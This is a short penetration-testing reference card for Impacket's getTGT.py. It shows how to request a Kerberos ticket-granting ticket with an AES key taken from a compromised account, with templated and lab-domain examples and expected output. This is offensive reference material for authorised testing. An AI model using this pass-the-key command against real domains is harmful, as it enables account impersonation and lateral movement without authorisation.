---
type: command
executor: bash
data: python getTGT.py -aesKey "$_AES_KEY" $_DOMAIN/$_USERNAME
tags:
  - kerberos
  - authentication
platforms:
  - Linux
verified: true
validated: true
---

# get-tgt-using-aes-key

## Command

```bash
python getTGT.py -aesKey "$_AES_KEY" $_DOMAIN/$_USERNAME
```

## Description

This command requests a Kerberos TGT using an AES encryption key instead of an NT hash, suitable when Kerberos keys are available from compromised accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_AES_KEY | 256-bit AES key in hexadecimal format | Yes |
| $_DOMAIN | Domain name | Yes |
| $_USERNAME | Username for the ticket | Yes |
| -aesKey | Flag to specify AES key for encryption | Built-in |

## Examples

### Basic Usage

```bash
python getTGT.py -aesKey "xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx" lab.ropnop.com/velociraptor
```

### Advanced Usage

```bash
python getTGT.py -aesKey "$AES_KEY" $DOMAIN/$USER -dc-ip $_DC_IP
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

Type username@domain for Kerberos ticket: 
Kerberos Session key: <key>
Saving ticket in velociraptor.ccache

Confirms TGT saved to ccache.

## Related

- [[procedures/OverPass-the-Hash-with-Impacket]]
- [[commands/get-tgt-using-nt-hash]]
